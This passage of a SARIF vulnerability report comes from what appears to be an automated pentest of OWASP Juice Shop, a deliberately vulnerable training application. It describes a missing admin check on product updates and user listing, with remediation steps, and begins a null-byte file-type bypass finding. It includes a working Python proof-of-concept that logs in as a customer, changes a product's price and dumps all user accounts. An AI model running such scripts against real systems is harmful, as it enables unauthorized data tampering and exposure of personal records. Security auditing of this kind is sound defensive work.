          ],
          "properties": {
            "security-severity": "8.1",
            "strix": {
              "id": "vuln-0011",
              "severity": "high",
              "cvss": 8.1,
              "timestamp": "2026-05-09 11:00:09 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/api/Products/:id",
              "method": "PUT",
              "cwe": "CWE-862",
              "impact": "Any authenticated user, regardless of assigned role, can:\n\n- Modify any product's name, description, price, and image in the catalog\n- Manipulate pricing to purchase items at reduced cost or deface product listings\n- Access the complete user directory (GET /api/Users/) exposing emails, roles, profile images, and account status of all registered users\n- Undermine data integrity of the product catalog and erode trust in the platform\n\nThis constitutes a horizontal and vertical privilege escalation since product modification is an administrative function that should be restricted to users with the admin role.",
              "technical_analysis": "The root cause is a missing authorization check on the PUT /api/Products/:id route. In server.ts at line 369, the authorization middleware is explicitly commented out:\n\n```\n// app.put('/api/Products/:id', security.isAuthorized())\n```\n\nThe finale-rest (or epilogue) ORM middleware automatically registers CRUD routes for all Sequelize models. When Express middleware chains are defined, they intercept requests before the default handler. Since the PUT middleware is commented out, there is no explicit authorization layer, and the default finale-rest handler processes the request for any caller.\n\nAdditionally, the GET /api/Users route (line 362) uses `security.isAuthorized()` which only validates the presence of a valid JWT — it does not verify the caller holds an administrative role. This means any customer-role account can enumerate the full user directory.",
              "remediation_steps": "1. Uncomment and strengthen the authorization middleware for PUT /api/Products/:id to require admin role:\n   - Replace the commented-out `security.isAuthorized()` with a role-checking middleware such as `security.isAdmin()`\n   - Ensure the middleware validates both token authenticity and admin role membership\n\n2. Add role-based authorization to the GET /api/Users/ endpoint:\n   - Replace `security.isAuthorized()` with an admin-only check\n   - Non-admin users should not be able to enumerate the user directory\n\n3. Review all API routes registered via the REST framework to ensure each has appropriate role-based authorization:\n   - Audit every route where `security.isAuthorized()` is used alone — this only checks authentication, not authorization\n   - Apply principle of least privilege: default to deny, then explicitly allow per role\n\n4. Implement centralized authorization middleware that enforces role checks consistently across all administrative endpoints.",
              "poc": {
                "description": "To reproduce:\n\n1. Authenticate as a non-admin user (e.g., jim@juice-sh.op / ncc-1701).\n2. Send a PUT request to /api/Products/1 with a modified description.\n3. Observe that the response returns HTTP 200 with the updated product data, confirming the modification succeeded.\n4. Send a GET request to /api/Users/ with the same non-admin token.\n5. Observe that all user accounts (including admin accounts) are returned.",
                "script": "import requests\nimport json\n\nBASE = \"http://host.docker.internal:3002\"\n\n# Step 1: Login as non-admin user (jim)\nlogin_resp = requests.post(f\"{BASE}/rest/user/login\",\n    json={\"email\": \"jim@juice-sh.op\", \"password\": \"ncc-1701\"})\njim_token = login_resp.json()[\"authentication\"][\"token\"]\nprint(f\"Logged in as jim (customer role), token obtained\")\n\n# Step 2: Modify a product (admin-only action)\nproduct_resp = requests.put(f\"{BASE}/api/Products/1\",\n    headers={\n        \"Authorization\": f\"Bearer {jim_token}\",\n        \"Content-Type\": \"application/json\"\n    },\n    json={\"description\": \"Unauthorized modification by non-admin user\", \"price\": 0.01})\n\nprint(f\"\\nPUT /api/Products/1 as non-admin:\")\nprint(f\"Status: {product_resp.status_code}\")\nproduct_data = product_resp.json()\nprint(f\"Modified description: {product_data['data']['description']}\")\nprint(f\"Modified price: {product_data['data']['price']}\")\n\n# Step 3: Access full user directory (should be admin-only)\nusers_resp = requests.get(f\"{BASE}/api/Users/\",\n    headers={\"Authorization\": f\"Bearer {jim_token}\"})\nprint(f\"\\nGET /api/Users/ as non-admin:\")\nprint(f\"Status: {users_resp.status_code}\")\nusers = users_resp.json()[\"data\"]\nprint(f\"Total users exposed: {len(users)}\")\nfor u in users[:5]:\n    print(f\"  id={u['id']}, email={u['email']}, role={u['role']}\")\n\n# Revert product\nrequests.put(f\"{BASE}/api/Products/1\",\n    headers={\"Authorization\": f\"Bearer {jim_token}\", \"Content-Type\": \"application/json\"},\n    json={\"description\": \"The all-time classic.\", \"price\": 1.99})"
              }
            }
          }
        },
        {
          "ruleId": "CWE-158",
          "level": "error",
          "message": {
            "text": "Null Byte Injection Bypasses File Type Restriction on FTP File Server"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/fileServer.ts"
                },
                "region": {
                  "startLine": 26,
                  "endLine": 38,
                  "snippet": {
                    "text": "function verify (file: string, res: Response, next: NextFunction) {\n    if (file && (endsWithAllowlistedFileType(file) || (file === 'incident-support.kdbx'))) {\n      file = security.cutOffPoisonNullByte(file)\n\n      challengeUtils.solveIf(challenges.directoryListingChallenge, () => { return file.toLowerCase() === 'acquisitions.md' })\n      verifySuccessfulPoisonNullByteExploit(file)\n\n      res.sendFile(path.resolve('ftp/', file))\n    } else {\n      res.status(403)\n      next(new Error('Only .md and .pdf files are allowed!'))\n    }\n  }"
                  }
                }
              },
              "message": {
                "text": "Allowlist check occurs before null byte sanitization, creating a check-vs-use inconsistency"
              }
            },
            {
